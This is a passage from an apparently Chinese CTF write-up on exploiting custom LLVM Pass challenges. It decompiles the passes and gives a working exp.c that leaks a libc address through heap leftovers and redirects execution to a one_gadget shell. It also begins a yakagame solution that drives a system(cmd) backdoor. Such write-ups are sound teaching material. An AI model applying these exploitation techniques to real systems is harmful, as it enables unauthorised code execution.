class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>);</span><br></pre></td></tr></table></figure><p>这里会执行<code>*byte_2040f8</code>，所以我们想如果可以修改<code>byte_2040f8</code>为<code>one_gadget</code>的地址，执行该段代码时我们就可以<code>getshell</code>了<br>于是对<code>byte_2040f8</code>进行交叉引用，看看什么地方可以对该值进行修改，接下来对能对该地址进行修改的部分代码进行详细分析<br>首先是对<code>fakekey</code>函数的处理,定位到关键部分：  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">v76 = byte_204100;</span><br><span class="line"><span class="keyword">if</span> ( *(_BYTE *)(*(_QWORD *)v75 + <span class="number">16LL</span>) == <span class="number">13</span> )</span><br><span class="line">  SExtValue = llvm::APInt::<span class="built_in">getSExtValue</span>((llvm::APInt *)(*(_QWORD *)v75 + <span class="number">24LL</span>));</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  SExtValue = <span class="number">0LL</span>;</span><br><span class="line">byte_204100 = v76 + SExtValue;</span><br><span class="line">*byte_2040f8 = v76 + SExtValue;</span><br></pre></td></tr></table></figure><p>可以看出该函数可以对<code>*byte_2040f8</code>和<code>byte_204100</code>的值加上一个用户自己定义的数，即<code>*byte_2040f8 = byte_204100 + 用户的value</code><br>接下来分析<code>stealkey</code>的关键部分：  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( byte_2040f8</span><br><span class="line">  &amp;&amp; !(<span class="number">-1431655765</span></span><br><span class="line">      * (<span class="type">unsigned</span> <span class="type">int</span>)((v15</span><br><span class="line">                      + <span class="number">24</span> * v65</span><br><span class="line">                      - <span class="number">24LL</span> * v66</span><br><span class="line">                      - (v8</span><br><span class="line">                      - <span class="number">24</span> * (<span class="type">unsigned</span> __int64)(*(_DWORD *)(v8 + <span class="number">20</span>) &amp; <span class="number">0xFFFFFFF</span>))) &gt;&gt; <span class="number">3</span>)) )</span><br><span class="line">&#123;</span><br><span class="line">  byte_204100 = *byte_2040f8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里会将<code>*byte_2040f8</code>赋值给<code>byte_204100</code><br>最后是对<code>save</code>部分的分析，其有下面这段关键代码：  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="number">-1431655765</span> * (<span class="type">unsigned</span> <span class="type">int</span>)((v15 + <span class="number">24</span> * v18 - <span class="number">24</span> * (<span class="type">unsigned</span> __int64)NumTotalBundleOperands - v20) &gt;&gt; <span class="number">3</span>) == <span class="number">2</span> )&#123;</span><br><span class="line">  v21 = *(_BYTE *)(v8 + <span class="number">16</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v21 == <span class="number">79</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v22 = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v21 != <span class="number">29</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_143;</span><br><span class="line">    v22 = <span class="number">-2LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v23 = v15</span><br><span class="line">      + <span class="number">24</span> * v22</span><br><span class="line">      - <span class="number">24LL</span> * (<span class="type">unsigned</span> <span class="type">int</span>)llvm::CallBase::<span class="built_in">getNumTotalBundleOperands</span>((llvm::CallBase *)(v6 - <span class="number">24</span>));</span><br><span class="line">  v24 = (__int64 *)(v8 - <span class="number">24LL</span> * (*(_DWORD *)(v8 + <span class="number">20</span>) &amp; <span class="number">0xFFFFFFF</span>));</span><br><span class="line">  <span class="keyword">if</span> ( !(<span class="number">-1431655765</span> * (<span class="type">unsigned</span> <span class="type">int</span>)((<span class="type">unsigned</span> __int64)(v23 - (_QWORD)v24) &gt;&gt; <span class="number">3</span>)) )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_154;</span><br><span class="line">  <span class="keyword">if</span> ( (*(_DWORD *)(v8 + <span class="number">20</span>) &amp; <span class="number">0xFFFFFFF</span>) == <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_153;</span><br><span class="line">  v25 = *v24;</span><br><span class="line">  v26 = *(_BYTE *)(v8 + <span class="number">16</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v26 == <span class="number">79</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v27 = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v26 != <span class="number">29</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_144;</span><br><span class="line">    v27 = <span class="number">-2LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v28 = v15</span><br><span class="line">      + <span class="number">24</span> * v27</span><br><span class="line">      - <span class="number">24LL</span> * (<span class="type">unsigned</span> <span class="type">int</span>)llvm::CallBase::<span class="built_in">getNumTotalBundleOperands</span>((llvm::CallBase *)(v6 - <span class="number">24</span>));</span><br><span class="line">  v29 = v8 - <span class="number">24LL</span> * (*(_DWORD *)(v8 + <span class="number">20</span>) &amp; <span class="number">0xFFFFFFF</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">-1431655765</span> * (<span class="type">unsigned</span> <span class="type">int</span>)((<span class="type">unsigned</span> __int64)(v28 - v29) &gt;&gt; <span class="number">3</span>) &lt;= <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_154;</span><br><span class="line">  <span class="keyword">if</span> ( (*(_DWORD *)(v8 + <span class="number">20</span>) &amp; <span class="number">0xFFFFFFF</span>u) &lt;= <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_153;</span><br><span class="line">  v30 = *(_QWORD *)(v29 + <span class="number">24</span>);</span><br><span class="line">  <span class="built_in">sub_2430</span>(&amp;src, v25);</span><br><span class="line">  <span class="built_in">sub_2430</span>(v84, v30);</span><br><span class="line">  v31 = n;</span><br><span class="line">  v32 = <span class="built_in">malloc</span>(<span class="number">0x18</span>uLL);</span><br><span class="line">  v32[<span class="number">2</span>] = byte_2040f8;</span><br><span class="line">  byte_2040f8 = v32;</span><br><span class="line">  v33 = (<span class="type">char</span> *)src;</span><br><span class="line">  <span class="built_in">memcpy</span>(v32, src, v31);</span><br><span class="line">  v34 = v32 + <span class="number">1</span>;</span><br><span class="line">  v35 = (<span class="type">char</span> *)v84[<span class="number">0</span>];</span><br><span class="line">  <span class="built_in">memcpy</span>(v34, v84[<span class="number">0</span>], (<span class="type">size_t</span>)v84[<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">if</span> ( v35 != &amp;v85 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">(v35)</span></span>;</span><br><span class="line">    v33 = (<span class="type">char</span> *)src;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v33 != v88 )</span><br><span class="line">    <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">(v33)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一行的代码意思是要求<code>save</code>函数要有<code>2</code>个参数，从代码中我们可以看出<code>byte_2040f8</code>指向一个新申请的<code>0x20</code>大小的堆块，而后面的操作看的也不是太懂，因为前面看的也不是很懂，于是用<code>gdb</code>调试了一下，测试脚本：  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// clang-8 -S -emit-llvm exp.c -o exp.ll</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">save</span><span class="params">(<span class="type">char</span> *a, <span class="type">char</span> *b)</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">B4ckDo0r</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>gdb</code>中查看<code>byte_2040f8</code>：  </p><img src="/2024/03/15/llvm/4.png" class="" title="我的图图呢">  <p>可以看到<code>byte_2040f8</code>指向一个新<code>malloc</code>的堆块，堆块大小为<code>0x18</code>，堆块的内容为<code>save</code>函数的第一和第二个参数，回到最开始程序刚进入到对<code>save</code>函数的进行处理的时候，我们看看堆块的布局：  </p><img src="/2024/03/15/llvm/5.png" class="" title="我的图图呢"><p>可以看到<code>unsortedbin</code>中存在一个堆块，<code>tcache</code>中有<code>7</code>个<code>0x20</code>大小的堆块，如果我们将<code>7</code>个堆块申请出来，再用<code>save</code>函数申请<code>0x20</code>大小的堆块，堆管理系统则会直接切割<code>unsortedbin</code>中的堆块进行分配，此时申请出来的堆块会残留着之前<code>unsortedbin</code>在<code>fd</code>上有关<code>libc</code>的地址，即我们可以令<code>*byte_2040f8</code>为<code>libc</code>上的一个地址<br>此时我们可利用<code>stealkey</code>函数将<code>*byte_2040f8</code>上的值赋值给<code>byte_204100</code>，代码如下：  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// clang-8 -S -emit-llvm exp.c -o exp.ll</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">save</span><span class="params">(<span class="type">char</span> *a, <span class="type">char</span> *b)</span></span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">takeaway</span><span class="params">(<span class="type">char</span> *c)</span></span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">stealkey</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">fakekey</span><span class="params">(<span class="type">int</span> d)</span></span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">B4ckDo0r</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">stealkey</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果如下：  </p><img src="/2024/03/15/llvm/6.png" class="" title="我的图图呢">  <p>再利用<code>fakekey</code>函数<code>*byte_2040f8 = byte_204100 - one_gadget与byte_204100上有关libc地址的偏移</code>，即可另<code>*byte_2040f8</code>的值为<code>one_gadget</code>的地址，最后使用<code>run</code>函数执行<code>one_gadget</code>直接<code>getshell</code>。最终<code>exp</code>如下：  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// clang-8 -S -emit-llvm exp.c -o exp.ll</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">save</span><span class="params">(<span class="type">char</span> *a, <span class="type">char</span> *b)</span></span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">takeaway</span><span class="params">(<span class="type">char</span> *c)</span></span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">stealkey</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">fakekey</span><span class="params">(<span class="type">int</span> d)</span></span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">B4ckDo0r</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">stealkey</span>();</span><br><span class="line">    <span class="built_in">fakekey</span>(<span class="number">-0x1090f2</span>);</span><br><span class="line">    <span class="built_in">run</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="强网杯-2022-yakagame"><a href="#强网杯-2022-yakagame" class="headerlink" title="[强网杯 2022] yakagame"></a>[强网杯 2022] yakagame</h2><p>这道题的<code>PASS</code>注册的名称并不能直接在<code>start</code>函数中找打，看了<code>winmt</code>师傅的文章发现可以对<code>__cxa_atexit</code>函数“交叉引用”来定位，如下图：  </p><img src="/2024/03/15/llvm/7.png" class="" title="我的图图呢">  <p>可以看见<code>PASS</code>注册的名称为<code>ayaka</code>（没事干给<code>ida64</code>换了一个主题哈哈哈）。接下来对主要函数进行分析，用上面题目的方法定位到<code>sub_C880</code>即为重写的<code>runOnFunction</code>函数。<br>还是和之前的方法一样，发现程序主要是对<code>gamestart</code>函数的定义进行分析和操作，接下来详细分析各个部分<br>对<code>fight</code>函数的处理：  </p><img src="/2024/03/15/llvm/8.png" class="" title="我的图图呢">  <p>该函数只能有一个参数，以该参数作为索引，从<code>weaponlist</code>数组中取出一个数<code>v53</code>与<code>boss</code>进行比较：  </p><ul><li>如果<code>v53</code>的值小于<code>boss</code>，则输出<code>loss</code>  </li><li>如果<code>v53</code>的值大于等于<code>boss</code>，则输出<code>win</code>，并进行赋值操作：<code>*score = v53 - boss</code>  </li><li>如果<code>*score &gt; 0x12345678</code>，则会进入<code>backdoor</code>函数</li></ul><p>接下来就看看这个<code>backdoor</code>函数：  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">backdoor</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;wow!! this is you gift&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">system</span>(cmd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以想到，如果我们可以控制<code>cmd</code>的值并且执行<code>backdoor</code>函数，我们就能够<code>getshell</code><br>对<code>merge</code>函数的处理：  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( (std::<span class="keyword">operator</span>==&lt;<span class="type">char</span>&gt;(v58, <span class="string">&quot;merge&quot;</span>) &amp; <span class="number">1</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">  v52 = llvm::CallBase::<span class="built_in">getNumOperands</span>(v60);</span><br><span class="line">  <span class="keyword">if</span> ( v52 != <span class="number">3</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  v15 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v60, <span class="number">0</span>);</span><br><span class="line">  v51 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v15);</span><br><span class="line">  v50 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v51);<span class="comment">// 参数一</span></span><br><span class="line">  v16 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v60, <span class="number">1u</span>);</span><br><span class="line">  v51 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v16);</span><br><span class="line">  v49 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v51);<span class="comment">// 参数二</span></span><br><span class="line">  weaponlist[v50] += weaponlist[v49];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数需要有<code>2</code>个参数，分别为<code>v50</code>和<code>v49</code>，最后进行<code>weaponlist[v50] += weaponlist[v49]</code>操作<br>下面几个函数比较容易看懂且用处不大，就不做分析<br>对<code>destroy</code>函数的处理：  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( (std::<span class="keyword">operator</span>==&lt;<span class="type">char</span>&gt;(v58, <span class="string">&quot;destroy&quot;</span>) &amp; <span class="number">1</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">  v48 = <span class="number">0</span>;</span><br><span class="line">  v47 = llvm::CallBase::<span class="built_in">getNumOperands</span>(v60);</span><br><span class="line">  <span class="keyword">if</span> ( v47 != <span class="number">2</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  v17 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v60, <span class="number">0</span>);</span><br><span class="line">  v46 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v17);</span><br><span class="line">  v48 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v46);</span><br><span class="line">  weaponlist[v48] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对<code>upgrade</code>函数的处理：  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( (std::<span class="keyword">operator</span>==&lt;<span class="type">char</span>&gt;(v58, <span class="string">&quot;upgrade&quot;</span>) &amp; <span class="number">1</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">  v45 = <span class="number">0</span>;</span><br><span class="line">  v44 = llvm::CallBase::<span class="built_in">getNumOperands</span>(v60);</span><br><span class="line">  <span class="keyword">if</span> ( v44 != <span class="number">2</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  v18 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v60, <span class="number">0</span>);</span><br><span class="line">  v43 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v18);</span><br><span class="line">  v45 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v43);</span><br><span class="line">  <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; <span class="number">256</span>; ++k )</span><br><span class="line">    weaponlist[k] += v45;</span><br><span class="line">  v19 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;upgrade finish&quot;</span>);</span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(v19, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  v20 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;enjoy your war&quot;</span>);</span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(v20, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面是一系列关于原神梗的函数（原神<code>56</code>级玩家）：  </p><img src="/2024/03/15/llvm/9.png" class="" title="我的图图呢">  <p>可以看出这一系列函数允许我们对<code>cmd</code>这个全局变量进行操作，所以我们可以通过对这几个函数的顺序进行适当的排序即可令<code>cmd</code>为我们想要的值<br>我们可以通过下面这段代码将<code>cmd</code>的值设置为<code>&quot;cat flag&quot;</code>  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">tiandongwanxiang</span>();</span><br><span class="line"><span class="built_in">wuxiangdeyidao</span>();</span><br><span class="line"><span class="built_in">guobapenhuo</span>();</span><br><span class="line"><span class="built_in">wuxiangdeyidao</span>();</span><br></pre></td></tr></table></figure><p>效果如下：  </p><img src="/2024/03/15/llvm/10.png" class="" title="我的图图呢">  <p>接下来是最重要的部分，当函数的名字不满足上述的所有条件后才会执行以下这段代码：  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  v37 = <span class="number">0</span>;</span><br><span class="line">  v36 = llvm::CallBase::<span class="built_in">getNumOperands</span>(v60);<span class="comment">// 获取函数的参数个数</span></span><br><span class="line">  <span class="keyword">if</span> ( v36 != <span class="number">2</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  v21 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v60, <span class="number">0</span>);</span><br><span class="line">  v35 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v21);</span><br><span class="line">  v37 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v35);<span class="comment">// 获取函数的第一个参数</span></span><br><span class="line">  v34 = std::map&lt;std::string,<span class="type">unsigned</span> <span class="type">char</span>&gt;::<span class="built_in">begin</span>(&amp;funMap[abi:cxx11]);<span class="comment">// v34为map的迭代器，指向begin</span></span><br><span class="line">  v33 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;                                 <span class="comment">// _Rb_tree_iterator为红黑树迭代器，map的底层即为红黑树</span></span><br><span class="line">    v32 = std::map&lt;std::string,<span class="type">unsigned</span> <span class="type">char</span>&gt;::<span class="built_in">end</span>(&amp;funMap[abi:cxx11]);</span><br><span class="line">    <span class="keyword">if</span> ( (std::_Rb_tree_iterator&lt;std::pair&lt;std::string <span class="type">const</span>,<span class="type">unsigned</span> <span class="type">char</span>&gt;&gt;::<span class="keyword">operator</span>!=(&amp;v34, &amp;v32) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;                        <span class="comment">// 如果迭代器到达map的尾端着退出循环</span></span><br><span class="line">    v22 = std::_Rb_tree_iterator&lt;std::pair&lt;std::string <span class="type">const</span>,<span class="type">unsigned</span> <span class="type">char</span>&gt;&gt;::<span class="keyword">operator</span>-&gt;(&amp;v34);<span class="comment">// </span></span><br><span class="line">                                    <span class="comment">// 将v34这个std::pair&lt;std::string const,unsigned char&gt;类型对象赋值给v22</span></span><br><span class="line">    <span class="keyword">if</span> ( (std::<span class="keyword">operator</span>==&lt;<span class="type">char</span>&gt;(v22, v58) &amp; <span class="number">1</span>) != <span class="number">0</span> )<span class="comment">// v58为函数名</span></span><br><span class="line">    &#123;                               <span class="comment">// map中存在该函数名</span></span><br><span class="line">      v23 = std::<span 